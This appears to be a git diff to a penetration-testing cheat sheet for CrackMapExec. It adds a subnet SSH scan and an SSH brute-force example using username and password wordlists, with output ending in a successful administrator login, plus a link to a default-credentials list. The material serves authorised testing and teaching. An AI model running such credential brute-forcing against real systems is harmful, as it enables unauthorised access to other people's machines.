@@ -85,10 +85,33 @@ The modules below can be used with the `-M` option.
 #### Checking SSH available
 
 ```plain
-$ cme ssh 10.10.10.1
+$ cme ssh 10.10.10.0/24
+SSH         10.10.10.2      22     10.10.10.2       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
 SSH         10.10.10.1      22     10.10.10.1       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
+SSH         10.10.10.3      22     10.10.10.3       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
+```
+
+#### Brute force SSH
+
+{{%attachments title="Related files" fa_icon_class="far fa-file" pattern=".*(txt)"/%}}
+
+```plain
+$ cme ssh 10.10.10.1 -u usernames.txt -p passwords.txt 
+SSH         10.10.10.1     22     10.10.10.1      [*] SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:admin Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:root Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:admin Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:root Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:Admin Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:Admin Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] 11111:x-admin Authentication failed.
+[...SNIP...]
+SSH         10.10.10.1     22     10.10.10.1      [-] administrator:administrator Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [-] administrator:welkom1234 Authentication failed.
+SSH         10.10.10.1     22     10.10.10.1      [+] administrator:x-admin 
 ```
 
 ### URL list
 
 * [GitHub.com - CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec/)
+* [Github.com - Default-Credentials-List](https://raw.githubusercontent.com/eset/malware-research/master/moose/targeted-vendors/default-credentials-list.txt)
